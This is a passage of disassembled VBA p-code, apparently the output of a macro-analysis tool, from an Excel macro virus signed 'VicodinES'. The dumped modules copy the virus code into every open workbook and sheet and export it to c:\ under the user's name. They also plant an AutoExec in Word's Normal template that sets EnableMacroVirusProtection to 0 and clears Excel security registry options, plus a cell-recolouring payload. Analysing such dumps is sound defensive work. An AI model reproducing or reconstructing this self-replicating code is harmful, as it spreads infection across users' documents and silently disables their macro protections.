' 	St Weins1 
' Line #42:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #43:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #45:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #49:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #50:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #51:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #52:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #53:
' 	ElseBlock 
' Line #54:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #60:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #61:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Private Sub AbuseWord())
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #67:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #68:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #69:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #72:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #73:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #74:
' 	ElseBlock 
' Line #75:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #76:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #77:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #78:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #85:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #86:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet1 - 7885 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	EndWith 
' Line #11:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld vbCr 
' 	St v1 
' Line #17:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #18:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #19:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #20:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #21:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #22:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #24:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #25:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	Label out 
' Line #30:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #31:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #32:
' 	LitVarSpecial (True)
' 	St run1 
' Line #33:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #36:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #37:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #38:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #41:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #42:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #43:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #45:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #49:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #50:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #51:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #52:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #53:
' 	ElseBlock 
' Line #54:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #60:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #61:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Private Sub AbuseWord())
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #67:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #68:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #69:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #72:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #73:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #74:
' 	ElseBlock 
' Line #75:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #76:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #77:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #78:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #85:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #86:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet2 - 7885 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	EndWith 
' Line #11:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld vbCr 
' 	St v1 
' Line #17:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #18:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #19:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #20:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #21:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #22:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #24:
' 	Ld Weins1 
